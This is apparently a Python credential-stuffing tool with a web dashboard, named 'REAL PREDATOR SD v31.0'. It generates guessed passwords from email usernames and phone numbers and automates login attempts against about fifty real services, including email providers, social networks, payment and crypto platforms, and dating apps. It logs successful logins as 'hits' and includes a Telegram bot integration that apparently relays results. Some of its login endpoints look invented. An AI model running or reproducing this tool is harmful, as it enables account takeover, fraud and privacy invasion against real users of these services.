# ================================================================
# REAL PREDATOR SD v31.0 - ULTIMATE HUNTER (MERGED)
...
class UltimatePredator:
    ...
    def _hunt_email(self, email):
        ...
        passwords = [username, username.lower(), username.upper(),
                     username+'123', username+'!', username+'@2024',
                     username+'1234', username+'2024',
                     'password', '123456', 'admin', 'welcome',
                     username+'123456', username+'password',
                     username+'2025', username+'!2024',
        ...
        if self.target_platform:
            ...
            if not platform: return results
                ...
                if result:
                    ...
                    if result['status'] == 'hit':
                        with self.lock:
                            ...
                            self.feed.append({
                                'type': 'hit',
                                'text': f"🎯 {platform['name']} | {email} | 🔑 {password}",
    ...
    def _hunt_phone(self, phone):
        ...
        passwords = [phone_clean, phone_clean+'123', 'password', '123456', phone_clean+'!', phone_clean+'2024']
        phone_platforms = ['WhatsApp', 'Telegram', 'Signal', 'WeChat', 'Line', 'Viber']
        
        for password in passwords[:6]:
            for platform_name in phone_platforms:
                platform = next((p for p in PLATFORMS if p['name'] == platform_name), None)
                if platform:
                    result = self._try_platform(phone, password, platform)
                    if result:
                        results.append(result)
                        if result['status'] == 'hit':
                            with self.lock:
                                ...
                                self.feed.append({
                                    'type': 'hit',
                                    'text': f"🎯 {platform_name} | {phone} | 🔑 {password}",
                                    'time': datetime.now().strftime('%H:%M:%S')
                                })
                        break
        return results
    ...
    # ================================================================
    # CHECK FUNCTIONS (All 50+ Platforms)
    # ================================================================
    ...
    def check_google(self, email, password, session):
        try:
            ...
            login = session.post('https://accounts.google.com/ServiceLoginAuth', data=data, allow_redirects=True, timeout=8)
    ...
    def check_microsoft(self, email, password, session):
        try:
            ...
            login = session.post('https://login.live.com/oauth20_authorize.srf', data=data, allow_redirects=True, timeout=8)
    ...
    def check_facebook(self, email, password, session):
        try:
            ...
            login = session.post('https://www.facebook.com/login/', data=data, allow_redirects=True, timeout=8)
            if 'home.php' in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_instagram(self, email, password, session):
        try:
            ...
            login = session.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers, timeout=8)
    ...
    def check_twitter(self, email, password, session):
        try:
            login = session.post("https://api.twitter.com/1.1/onboarding/task.json", data={'username': email, 'password': password}, timeout=8)
            if '"success":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    
    def check_tiktok(self, email, password, session):
        try:
            login = session.post("https://www.tiktok.com/api/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    
    def check_snapchat(self, email, password, session):
        try:
            login = session.post("https://accounts.snapchat.com/api/v2/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_reddit(self, email, password, session):
        try:
            login = session.post("https://www.reddit.com/api/login", data={"user": email, "passwd": password}, timeout=8)
    ...
    def check_linkedin(self, email, password, session):
        try:
            ...
            if not csrf: return None, 'bad'
            login = session.post("https://www.linkedin.com/checkpoint/lg/login-submit", data={"session_key": email, "session_password": password, "csrfToken": csrf.group(1)}, allow_redirects=True, timeout=8)
    ...
    def check_pinterest(self, email, password, session):
        try:
            login = session.post("https://www.pinterest.com/resource/UserLoginResource/get/", data={"email": email, "password": password}, timeout=8)
            if '"success":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_tumblr(self, email, password, session):
        try:
            login = session.post("https://www.tumblr.com/api/login", data={"email": email, "password": password}, timeout=8)
    ...
    def check_telegram(self, email, password, session):
        try:
            login = session.post("https://my.telegram.org/auth", data={"phone": email, "password": password}, timeout=8)
    ...
    def check_signal(self, email, password, session):
        try:
            login = session.post("https://signal.org/api/v1/accounts/login", json={"username": email, "password": password}, timeout=8)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_wechat(self, email, password, session):
        try:
            login = session.post("https://web.wechat.com/cgi-bin/wechat/login", data={"username": email, "password": password}, timeout=8)
    ...
    def check_line(self, email, password, session):
        try:
            login = session.post("https://api.line.me/v2/oauth/login", json={"username": email, "password": password}, timeout=8)
    ...
    def check_viber(self, email, password, session):
        try:
            login = session.post("https://account.viber.com/login", data={"username": email, "password": password}, timeout=8)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_skype(self, email, password, session):
        try:
            login = session.post("https://login.skype.com/login", data={"username": email, "password": password}, timeout=8)
            if login.status_code == 200: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_discord(self, email, password, session):
        try:
            login = session.post("https://discord.com/api/v9/auth/login", json={"login": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_steam(self, email, password, session):
        try:
            ...
            if not csrf: return None, 'bad'
            login = session.post("https://store.steampowered.com/login/dologin/", data={"username": email, "password": password, "csrf_token": csrf.group(1)}, timeout=8)
            if '"success":true' in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_twitch(self, email, password, session):
        try:
            login = session.post("https://id.twitch.tv/oauth2/token", data={"client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko", "login": email, "password": password, "grant_type": "password"}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_epic(self, email, password, session):
        try:
            login = session.post("https://www.epicgames.com/id/api/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_riot(self, email, password, session):
        try:
            login = session.post("https://auth.riotgames.com/api/v1/authorization", json={"client_id": "riot-client", "username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_playstation(self, email, password, session):
        try:
            login = session.post("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_xbox(self, email, password, session):
        try:
            login = session.post("https://login.live.com/oauth20_authorize.srf", data={"login": email, "passwd": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_nintendo(self, email, password, session):
        try:
            login = session.post("https://api.nintendo.com/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_ubisoft(self, email, password, session):
        try:
            login = session.post("https://api.ubisoft.com/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_netflix(self, email, password, session):
        try:
            ...
            login = session.post(auth_url.group(1), data={"email": email, "password": password}, allow_redirects=True, timeout=8)
    ...
    def check_spotify(self, email, password, session):
        try:
            login = session.post("https://accounts.spotify.com/api/login", data={"username": email, "password": password}, timeout=8)
    ...
    def check_amazon(self, email, password, session):
        try:
            ...
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://www.amazon.com/ap/signin", data={"email": email, "password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=8)
    ...
    def check_hulu(self, email, password, session):
        try:
            login = session.post("https://auth.hulu.com/api/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_disney(self, email, password, session):
        try:
            login = session.post("https://www.disneyplus.com/api/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_hbomax(self, email, password, session):
        try:
            login = session.post("https://auth.hbomax.com/api/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_paypal(self, email, password, session):
        try:
            ...
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://www.paypal.com/signin", data={"login_email": email, "login_password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=8)
    ...
    def check_binance(self, email, password, session):
        try:
            login = session.post("https://www.binance.com/api/v1/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_coinbase(self, email, password, session):
        try:
            login = session.post("https://api.coinbase.com/v2/oauth/token", json={"grant_type": "password", "username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_kraken(self, email, password, session):
        try:
            login = session.post("https://api.kraken.com/0/private/Login", json={"username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_robinhood(self, email, password, session):
        try:
            login = session.post("https://api.robinhood.com/api/v1/auth/login", json={"username": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_tinder(self, email, password, session):
        try:
            login = session.post("https://api.gotinder.com/v2/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_bumble(self, email, password, session):
        try:
            login = session.post("https://bumble.com/api/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_hinge(self, email, password, session):
        try:
            login = session.post("https://api.hinge.com/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_okcupid(self, email, password, session):
        try:
            login = session.post("https://www.okcupid.com/login", data={"email": email, "password": password}, timeout=8)
    ...
    def check_grindr(self, email, password, session):
        try:
            login = session.post("https://api.grindr.com/v1/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_badoo(self, email, password, session):
        try:
            login = session.post("https://badoo.com/api/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_muzz(self, email, password, session):
        try:
            login = session.post("https://api.muzz.com/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_shaadi(self, email, password, session):
        try:
            login = session.post("https://api.shaadi.com/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_yahoo(self, email, password, session):
        try:
            ...
            csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
            if not csrf: return None, 'bad'
            login = session.post("https://login.yahoo.com/account/login", data={"username": email, "password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=8)
    ...
    def check_protonmail(self, email, password, session):
        try:
            login = session.post("https://api.protonmail.com/auth", json={"Username": email, "Password": password}, timeout=8)
            if login.status_code == 200 and "access_token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_mailcom(self, email, password, session):
        try:
            login = session.post("https://api.mail.com/v1/auth/login", json={"email": email, "password": password}, timeout=8)
            if login.status_code == 200 and "token" in login.text: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
    ...
    def check_yandex(self, email, password, session):
        try:
            login = session.post("https://passport.yandex.com/auth", data={"login": email, "passwd": password}, timeout=8)
    ...
    def check_aol(self, email, password, session):
        try:
            login = session.post("https://login.aol.com/account/login", data={"username": email, "password": password}, timeout=8)
    ...
    def check_github(self, email, password, session):
        try:
            ...
            if not csrf: return None, 'bad'
            login = session.post("https://github.com/session", data={"login": email, "password": password, "authenticity_token": csrf.group(1)}, allow_redirects=True, timeout=8)
    ...
    def check_apple(self, email, password, session):
        try:
            login = session.post("https://idmsa.apple.com/appleauth/auth/signin", json={"accountName": email, "password": password}, timeout=8)
    ...
    def check_zoom(self, email, password, session):
        try:
            login = session.post("https://zoom.us/signin", data={"email": email, "password": password}, timeout=8)
            if "dashboard" in login.url: return {'success': True}, 'hit'
            return None, 'bad'
        except: return None, 'error'
        ...
        try:
            ...
            if predator.combos:
                ...
                for _ in range(batch_size):
                    ...
                    predator.smart_hunt(f"{name}@{domain}")
            
            with state['lock']:
                state['checked'] += batch_size
...
<html>
<head><meta charset="UTF-8"><title>REAL PREDATOR SD v31.0</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
...
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:6px;margin:8px 0}
.stat-box{background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.06);border-radius:6px;padding:10px;text-align:center}
.stat-box .num{font-size:26px;font-weight:700;display:block}
.stat-box .label{font-size:9px;color:#006622}
.stat-box.green .num{color:#00ff41}
.stat-box.gold .num{color:#ffd700}
.stat-box.red .num{color:#ff0044}
.stat-box.blue .num{color:#0088cc}
.progress-bar{height:4px;background:rgba(0,255,65,0.05);border-radius:2px;overflow:hidden;margin:5px 0}
...
@media(max-width:768px){.stats-grid{grid-template-columns:repeat(4,1fr)}}
</style>
</head>
<body>
<div class="container">
    <header class="header">
        <h1>REAL <span>PREDATOR</span> <span class="sd">SD</span> <span style="font-size:12px;color:#006622;">v31.0</span></h1>
    ...
    <div class="card">
        <div style="display:flex;gap:15px;flex-wrap:wrap;align-items:center;">
            ...
            <span style="color:#006622;font-size:11px;">⏱ <span id="elapsed">00:00:00</span></span>
            <span style="color:#006622;font-size:11px;">⚡ <span id="cpm">0</span> RPM</span>
            <span style="color:#00ff41;">🎯 <span id="hitCount">0</span></span>
            <span style="color:#ff0044;">❌ <span id="badCount">0</span></span>
    ...
    <div class="stats-grid">
        ...
        <div class="stat-box blue"><span class="num" id="statErrors">0</span><span class="label">ERROR</span></div>
        <div class="stat-box gold"><span class="num" id="statGaming">0</span><span class="label">GAME</span></div>
        <div class="stat-box green"><span class="num" id="statSpeed">0</span><span class="label">RPM</span></div>
        <div class="stat-box green"><span class="num" id="statTotal">{{ platforms|length }}</span><span class="label">TOTAL</span></div>
        <div class="stat-box red"><span class="num" id="statRemaining">0</span><span class="label">REMAIN</span></div>
    </div>

    <div class="card">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div style="display:flex;justify-content:space-between;font-size:9px;color:#006622;">
            <span id="progressPct">0%</span>
            <span id="progressCount">0 / 1000</span>
        </div>
    </div>
    ...
    <div class="card">
        <div class="control-bar">
            ...
            <div class="config-row">
                <label>RPM:</label>
                <input type="number" id="speedInput" value="35" min="5" max="70" style="width:60px;">
            </div>
        </div>
    ...
    <div style="text-align:center;padding:10px;color:#006622;font-size:8px;border-top:1px solid rgba(0,255,65,0.05);margin-top:10px;">
        ⚡ REAL PREDATOR SD v31.0 | {{ platforms|length }}+ Platforms | Developer: @MRDPY
    </div>
</div>
...
document.getElementById('tgTestBtn').addEventListener('click', async function() {
    ...
    try {
        const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            ...
            body: JSON.stringify({ chat_id: chatId, text: '⚡ Test from REAL PREDATOR SD v31.0' })
        });
...
document.getElementById('startBtn').addEventListener('click', async function() {
    const speed = parseInt(document.getElementById('speedInput').value) || 35;
...
async function updateStats() {
    try {
        ...
        if (!d.success) return;
        document.getElementById('statChecked').textContent = d.checked || 0;
        ...
        document.getElementById('statGaming').textContent = d.gaming || 0;
        document.getElementById('statSpeed').textContent = d.cpm || 0;
        document.getElementById('statRemaining').textContent = Math.max(0, 1000 - (d.checked || 0));
        document.getElementById('hitCount').textContent = d.hits || 0;
        document.getElementById('badCount').textContent = d.bad || 0;
        ...
        const pct = Math.min((checked / 1000) * 100, 100);
        document.getElementById('progressFill').style.width = pct + '%';
        document.getElementById('progressPct').textContent = pct.toFixed(1) + '%';
        document.getElementById('progressCount').textContent = checked + ' / 1000';
        if (d.running) {
            document.getElementById('statusBadge').className = 'status-badge running';
            document.getElementById('statusDot').className = 'status-dot running';
            document.getElementById('statusText').textContent = 'RUNNING';
